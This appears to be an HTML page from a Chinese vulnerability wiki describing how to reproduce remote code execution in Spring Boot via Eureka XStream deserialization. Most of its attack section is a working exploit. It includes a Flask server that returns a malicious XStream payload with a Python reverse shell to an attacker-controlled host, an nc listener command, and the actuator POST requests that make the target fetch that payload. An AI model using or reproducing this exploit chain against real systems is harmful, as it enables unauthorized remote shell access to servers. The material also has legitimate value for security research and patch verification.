@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Spring%20Boot/Spring%20Boot%20eureka%20xstream%20deserialization%20rce/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Spring Boot eureka xstream deserialization rce - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Spring Boot eureka xstream deserialization rce", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_3" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-link">
+        Spring Boot h2 database query rce
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Spring Boot Tomcat导致的JNDI注入
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="spring-boot-eureka-xstream-deserialization-rce">Spring Boot eureka xstream deserialization rce<a class="headerlink" href="#spring-boot-eureka-xstream-deserialization-rce" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h4 id="_2">利用条件：<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
+<ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在
+    <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标使用的 <code>eureka-client</code> \&lt; 1.8.7（通常包含在
+    <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
+<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h2 id="_3">二、漏洞影响<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h2 id="_4">三、复现过程<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<h4 id="_5">漏洞分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h4>
+<ol>
+<li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka
+    server URL 地址</li>
+<li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server
+    就会返回恶意的 payload</li>
+<li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
+</ol>
+<h3 id="_6">漏洞复现<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<h5 id="xstream-payload">步骤一：架设响应恶意 XStream payload 的网站<a class="headerlink" href="#xstream-payload" title="Permanent link">&para;</a></h5>
+<p>提供一个依赖 Flask 并符合要求的python，作用是利用目标 Linux 机器上自带的
+python 来反弹shell。</p>
+<p>使用 python
+在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell
+的 ip 地址和 端口号。</p>
+<div class="codehilite"><pre><span></span><code><span class="n">springboot</span><span class="o">-</span><span class="n">xstream</span><span class="o">-</span><span class="n">rce</span><span class="o">.</span><span class="n">py</span>
+<span class="c1">#!/usr/bin/env python</span>
+<span class="c1"># coding: utf-8</span>
+<span class="c1"># -**- Author: LandGrey -**-</span>
+
+<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">Response</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">defaults</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">})</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&lt;path:path&gt;&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">catch_all</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="n">xml</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span>
+<span class="s2">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span>
+<span class="s2">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span>
+<span class="s2">      &lt;dataHandler&gt;</span>
+<span class="s2">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span>
+<span class="s2">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span>
+<span class="s2">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span>
+<span class="s2">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span>
+<span class="s2">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span>
+<span class="s2">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span>
+<span class="s2">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span>
+<span class="s2">                    &lt;command&gt;</span>
+<span class="s2">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span>
+<span class="s2">                       &lt;string&gt;-c&lt;/string&gt;</span>
+<span class="s2">                       &lt;string&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;&lt;/string&gt;</span>
+<span class="s2">                    &lt;/command&gt;</span>
+<span class="s2">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span>
+<span class="s2">                  &lt;/next&gt;</span>
+<span class="s2">                &lt;/iter&gt;</span>
+<span class="s2">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span>
+<span class="s2">                  &lt;method&gt;</span>
+<span class="s2">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span>
+<span class="s2">                    &lt;name&gt;start&lt;/name&gt;</span>
+<span class="s2">                    &lt;parameter-types/&gt;</span>
+<span class="s2">                  &lt;/method&gt;</span>
+<span class="s2">                  &lt;name&gt;foo&lt;/name&gt;</span>
+<span class="s2">                &lt;/filter&gt;</span>
+<span class="s2">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span>
+<span class="s2">              &lt;/serviceIterator&gt;</span>
+<span class="s2">              &lt;lock/&gt;</span>
+<span class="s2">            &lt;/cipher&gt;</span>
+<span class="s2">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span>
+<span class="s2">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span>
+<span class="s2">          &lt;/is&gt;</span>
+<span class="s2">        &lt;/dataSource&gt;</span>
+<span class="s2">      &lt;/dataHandler&gt;</span>
+<span class="s2">    &lt;/value&gt;</span>
+<span class="s2">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span>
+<span class="s2">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span>
+    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">xml</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s1">&#39;application/xml&#39;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
+</code></pre></div>
+
+<h5 id="shell">步骤二：监听反弹 shell 的端口<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h5>
+<p>一般使用 nc 监听端口，等待反弹 shell</p>
+<div class="codehilite"><pre><span></span><code>nc -lvp 443
+</code></pre></div>
+
+<h5 id="eurekaclientserviceurldefaultzone">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性<a class="headerlink" href="#eurekaclientserviceurldefaultzone" title="Permanent link">&para;</a></h5>
+<p>spring 1.x</p>
+<div class="codehilite"><pre><span></span><code>POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
+</code></pre></div>
+
+<p>spring 2.x</p>
+<div class="codehilite"><pre><span></span><code>POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;}
+</code></pre></div>
+
+<h5 id="_7">步骤四：刷新配置<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h5>
+<p>spring 1.x</p>
+<div class="codehilite"><pre><span></span><code>POST /refresh
+Content-Type: application/x-www-form-urlencoded
+</code></pre></div>
+
+<p>spring 2.x</p>
+<div class="codehilite"><pre><span></span><code>POST /actuator/refresh
+Content-Type: application/json
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Spring%20Boot%20h2%20database%20query%20rce/" class="btn btn-xs btn-link">
+        Spring Boot h2 database query rce
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Spring%20Boot%20Tomcat%E5%AF%BC%E8%87%B4%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        Spring Boot Tomcat导致的JNDI注入
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
